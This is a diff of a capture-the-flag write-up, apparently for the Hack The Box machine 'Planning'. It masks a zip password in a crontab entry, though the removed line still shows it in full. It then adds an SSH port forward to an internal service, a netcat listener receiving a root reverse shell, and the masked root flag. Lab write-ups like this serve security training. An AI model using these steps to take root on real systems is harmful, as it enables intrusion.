@@ -173,7 +173,59 @@ d6490b4738f60764133*****
 
 ```
 enzo@planning:/opt/crontabs$ cat crontab.db 
-{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
+{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rd***** /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
 {"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
 ```
+
+```
+Hexada@hexada ~/Downloads$ ssh enzo@planning.htb -L 8000:127.0.0.1:8000
+```
+
+![image](https://github.com/user-attachments/assets/fc6f2e74-ff15-49cf-8b38-fc102ff0a6d0)
+
+![image](https://github.com/user-attachments/assets/2f535388-666c-46e9-bb11-2e6af392fb35)
+
+![image](https://github.com/user-attachments/assets/9f1106b4-d084-4263-84bd-7f84ca24f466)
+
+```
+Hexada@hexada ~/Downloads$ nc -lvnp 1717                                                              
+Connection from 10.10.11.68:50944
+bash: cannot set terminal process group (1395): Inappropriate ioctl for device
+bash: no job control in this shell
+root@planning:/# ls
+ls
+bin
+bin.usr-is-merged
+boot
+cdrom
+dev
+etc
+home
+lib
+lib64
+lib.usr-is-merged
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+sbin.usr-is-merged
+srv
+sys
+tmp
+usr
+var
+```
+
+```
+root@planning:~# cat root.txt
+cat root.txt
+6286edbd2f68f2c795a*****
+```
+
+
+
 
